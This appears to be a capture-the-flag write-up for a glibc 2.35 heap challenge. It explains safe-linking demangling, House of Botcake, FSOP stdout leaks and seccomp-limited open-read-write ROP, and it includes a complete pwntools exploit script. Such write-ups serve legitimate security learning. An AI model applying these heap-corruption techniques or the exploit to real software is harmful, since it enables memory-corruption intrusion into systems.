
## Level: Medium+

### Challenge



#### TL;DR
- Leak a mangled heap ptr (UAF) and libc address from unsorted bin, then perform a House of Botcake attack to get read-what-where

- use this to get a stack leak via FSOP on stdout and perform House of Botcake again to do ROP from saved_rip of fgets()

- use the gadgets in libc to write out the flag to stdout with ORW syscalls 

- ... and *voilà !* 

```
Welcome to the post office.
Enter your choice below:
1. Write a letter
2. Send a letter
3. Read a letter
>
```
> classic heap challenge menu

```c
local_20 = seccomp_init(0);
seccomp_rule_add(local_20, 0x7fff0000,2,0);
seccomp_rule_add(local_20, 0x7fff0000,0,0);
seccomp_rule_add(local_20, 0x7fff0000,1,0);
seccomp_rule_add(local_20, 0x7fff0000,5,0);
seccomp_rule_add(local_20, 0x7fff0000,0x3c,0);
seccomp_loead(local_20);
```
> with restricted syscalls...

```
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
> honestly
> love it when it's protected with the latest mechanism

![notgoodgif](https://tokyoking.github.io/assets/gifs/notgoodnotgood.gif)


We can't overwrite got entries due to Full RELRO, can't use one_gadgets and other tricks like system("/bin/sh") due to seccomp restrictions...

however ORW syscall are allowed, we can write out the flag if we can get a stack leak and ROP from some stack frame

Also one more thing to consider, safe-linking is enabled but ehh not a big deal honestly...

### Safe-Linking

[from glibc 2.35:](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L349)

```c
/* Safe-Linking:
   Use randomness from ASLR (mmap_base) to protect single-linked lists
   of Fast-Bins and TCache.  That is, mask the "next" pointers of the
   lists' chunks, and also perform allocation alignment checks on them.
   This mechanism reduces the risk of pointer hijacking, as was done with
   Safe-Unlinking in the double-linked lists of Small-Bins.
   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
   larger pages provide less entropy, although the pointer mangling
   still works.  */
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

Basically tcache and fastbins next pointers are mangled to prevent classic heap attacks. 

So when we leak an address via UAF, it's going to be mangled in glibc 2.35 and higher

this just makes it harder to exploit, but still exploitable...

We can demangle the mangled pointer with this simple demangle function that I stole from Rob's stream 😏

```python
def demangle(ptr):
    mid = ptr ^ (ptr >> 12)
    return mid ^ (mid >> 24)
```
If you want to learn why this works, I'd recommend watching pwncollege's safe-linking video in dynamic allocation exploit module. 

so our approach should be somewhat like this:

```
1 - Leak mangled next pointer of a chunk via UAF and demangle it to get the demangled next pointer
2 - Leak the libc address in unsorted bin
3 - Perform House of Botcake attack to get read-what-where
4 - Leak environ's stack address via file struct arbitrary write
5 - ROP from saved rip of something using House of Botcake again
```

uhh.. how to perform House of Botcake technique ? 

### House of Botcake

This technique bypasses double free restriction on tcache...

thus we can simply double free the victim and do a tcache poisoning or whatever. 

(Taken from [ret2school's](https://ret2school.github.io/post/mailman/) and [surgdev's](https://surg.dev/ictf23/) writeups and made _minor_ changes, also check [shellphish's example](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c))

```
1 - Allocate 7 0x100 sized chunks to then fill the tcache (7 entries).
2 - Allocate two more 0x100 sized chunks (a previous chunk and victim chunk) 
3 - Allocate a small “barrier” 0x10 sized chunk. (to prevent any further consolidation past our victim chunk)
4 - Fill the tcache by freeing the first 7 chunks.
5 - Free victum chunk, it ends up in the unsorted bin, since its too large for any other bin.
6 - Free previous chunk, because malloc now sees two large, adjacent chunks, it consoldates them and places a 0x221 size block into the unsorted bin. (malloc automatically allocs 16 bytes more than what we ask, and uses the last byte as a flag, so this is the result of 2 0x110 chunks)
7 - Request one more 0x100 sized chunk to let a single entry available in the tcache.
8 - Free victim chunk again, this bypasses the naive double free exception, and since our victim chunk has the info for a 0x110 byte block, it gets placed into the tcache (uh oh).
9 - That’s finished, to get a read what where we just need to request a 0x130 sized chunk (enough to overwrite the metadata of the next chunk). Thus we can hiijack the next fp of a that is currently referenced by the tcache by the location we wanna write to. And next time two 0x100 sized chunks are requested, first we'll get the victim chunk but then tcache will point to the target location.
```

We will perform this attack with FSOP on stdout to leak the stack address pointed by `envrion`.

### File Structure

As of now, I don't know much about how to exploit File Structures, but I sure know how to get an arbitrary write...

its really usefull to get leaks from no leak heap exploits 🙂

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
```

and this awesome document about [arbitrary read and write](https://docs.google.com/presentation/d/149aANrvqmttaizMs_XGWh843DTNSd8Da9G50m3gwt5I/edit#slide=id.p) from pwn.college is all you need..

![filest](https://github.com/user-attachments/assets/949e983f-b669-4c17-8937-27a0a25465b1)

We can also set `char* _IO_read_end` and `char* _IO_write_base` the beginning of a memory that we want to write out and we set `chat* _IO_write_ptr` to the end of that value and everything else to `NULL`, we will be able to leak out a value of our choosing...

With this we will get a stack leak and now we just need ROP... from where ?

main() doesn't exit, so I targeted fgets() saved_rip and wrote out the flag to stdout.

```
[+] Starting local process './mailman_patched': pid 14129
mangled ptr: 0x563bb7a0b38f
demangled ptr: 0x563ed44df750
libc base at: 0x7fad66800000
cleaning tcache and smallbins...
environ at:  + 0x7fad66a21200
stdout at: + 0x7fad66a1a780
stack leak: 0x7ffe9a52c7d8
saved rip of fgets(): 0x7ffe9a52c650
[*] '/home/4rsp/Downloads/imaginaryctf23/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[*] Loaded 218 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$  
```

and we see the flag...

here is the full exploit code with comments (not the best...)

```python
#!/usr/bin/env python3

from pwn import *
import time

'''
p = gdb.debug("./mailman_patched", gdbscript="""
    c
""")
'''
p = process("./mailman_patched")

context.arch = 'amd64'

def malloc_letter(idx, size, content):
    p.sendline(b"1")
    p.recvuntil(b"idx: ")
    p.sendline(str(idx).encode('utf-8'))
    p.recvuntil(b"letter size: ")
    p.sendline(str(size).encode('utf-8'))
    p.recvuntil(b"content: ")
    p.sendline(content)

def free_letter(idx):
    p.sendline(b"2")
    p.recvuntil(b"idx: ")
    p.sendline(str(idx).encode('utf-8'))

def read_letter(idx):
    p.sendline(b"3")
    p.recvuntil(b"idx: ")
    p.sendline(str(idx).encode('utf-8'))
    leak = int.from_bytes(p.recvline().strip(), 'little')
    return leak 

def demangle(ptr):
    mid = ptr ^ (ptr >> 12)
    return mid ^ (mid >> 24)

# leak mangled_ptr (UAF)
content = b"aaaa"
p.recvuntil(b">")
malloc_letter(0, 20, content)
malloc_letter(1, 20, content)

free_letter(0)
free_letter(1)

mangled_ptr = read_letter(0)
print(f"mangled ptr: {hex(mangled_ptr)}")

# demangle it 
ptr = demangle(mangled_ptr)
print(f"demangled ptr: {hex(ptr)}")

# leak the libc address in unsorted bin
for i in range(9):
    content = b"bbbb"
    malloc_letter(i+2, 130, content)
    time.sleep(0.1)

for i in range(8):
    free_letter(i+2)
    time.sleep(0.1)

libc_leak = read_letter(9)
# print(hex(libc_leak))

libc_base = libc_leak - 2202848
print(f"libc base at: {hex(libc_base)}")

# malloc until you empty the bins 
# size - 0x10 for the metadata
print("cleaning tcache and smallbins...")
for i in range(7):
    malloc_letter(15, 0x10, b'a')
for i in range(7):
    malloc_letter(15, 0x60, b'a')
for i in range(7):
    malloc_letter(15, 0x70, b'a')
for i in range(7):
    malloc_letter(15, 0x80, b'a')
for i in range(5):
    malloc_letter(15, 0xc0, b'a')
for i in range(2):
    malloc_letter(15, 0xd0, b'a')
for i in range(2):
    malloc_letter(15, 0xe0, b'a')
for i in range(9):
    malloc_letter(15, 0x60, b'a')
for i in range(9):
    malloc_letter(15, 0x10, b'a')
for i in range(2):
    malloc_letter(15, 0x70, b'a')
for i in range(1):
    malloc_letter(15, 0x80, b'a')

### HOUSE OF BOTCAKE
# allocate 7 chunks to fill tcache later  
for i in range(7):
    malloc_letter(i+3, 256, b"a")

# for later consolidation (previous chunk)
malloc_letter(0, 256, b"aaaa")
# victum chunk 
malloc_letter(1, 256, b"bbbb")
# small barrier chunk (to prevent any further consodilation past our victim chunk)
# also, will use when we call OPEN with this chunk's addr as a pointer to "flag.txt"
malloc_letter(2, 16, b"flag.txt\00")

# now cause chunk overlapping
# fill up tcache list
for i in range(7):
    free_letter(i+3)

# free the victim chunk so it will be added to unsorted bin
free_letter(1)

# free the previous chunk and make it consolidate with the victim chunk
free_letter(0)

# open up a slot in the tcache for our victim
malloc_letter(15, 256, b"aaaa")

# vulnerability (DOUBLE FREE)
# now victim is in tcache
free_letter(1)

# we have fully control over on this chunk
# size should be big enough to overwrite the metadata 
# trick malloc return to arbitrary pointer (stdout file struct to leak a stack addr)
environ = libc_base + 2232832
stdout = libc_base + 2205568
print(f"environ at:  + {hex(environ)}")
print(f"stdout at: + {hex(stdout)}")

payload = b"A" * 264 + p64(0x111)

# addr should be mangled
payload += p64(stdout ^ ((ptr + 6928) >> 12))
malloc_letter(2, 304, payload)

# now malloc returned a pointer to stdout
malloc_letter(3, 256, b"")

### FILE STRUCT arbitrary write

'''
# testing pwntools FileStructure() feature
# print out to compare stuff..
# if too big, slice it...

fp = FileStructure()
fp.flags = 0xfbad1800
fp._IO_write_end = environ + 8
fp.write(environ, 8)
fp._IO_buf_base = environ
fp._IO_buf_end = environ + 8

print(fp)
print(bytes(fp))

malloc_letter(3, 256, new_fp)
'''

# writing from arbitrary memory to stdout
payload = p64(0xfbad1800)
payload += p64(environ) * 3
payload += p64(environ)
payload += p64(environ + 0x8) * 2
payload += p64(environ+8)
payload += p64(environ+8)
malloc_letter(4, 256, payload)

stack_leak = u64(p.recv(8).strip().ljust(8, b'\x00'))
print(f"stack leak: {hex(stack_leak)}")

### with this stack leak, time to ROP our way out of this..
# free victim and previous chunk to do ROP this time

free_letter(1)
free_letter(0)

payload = b"A" * 264 + p64(0x111)

# overwrite the saved rip of fgets()
saved_rip = stack_leak - 392 

# addr should be mangled 
payload += p64(saved_rip ^ ((ptr + 6928) >> 12))
malloc_letter(2, 304, payload)
print(f"saved rip of fgets(): {hex(saved_rip)}")

# pwntools ROP
# ORW syscalls are permitted (Open - Read - Write)
# use them to get the flag

flag = ptr + 7200
output = flag + 0x20

libc = ELF("./libc.so.6")
libc.address = libc_base
rop = ROP(libc)
payload = b"B" * 40
rop.call('syscall', [2, flag, 0, 0])
rop.call('syscall', [0, 3, output, 0x64])
rop.call('syscall', [1, 1, output, 0x64])

# gdb.attach(p)
# print(rop.dump())
malloc_letter(3, 256, b"aaaa")
malloc_letter(3, 256, payload + rop.chain())

p.interactive()
```
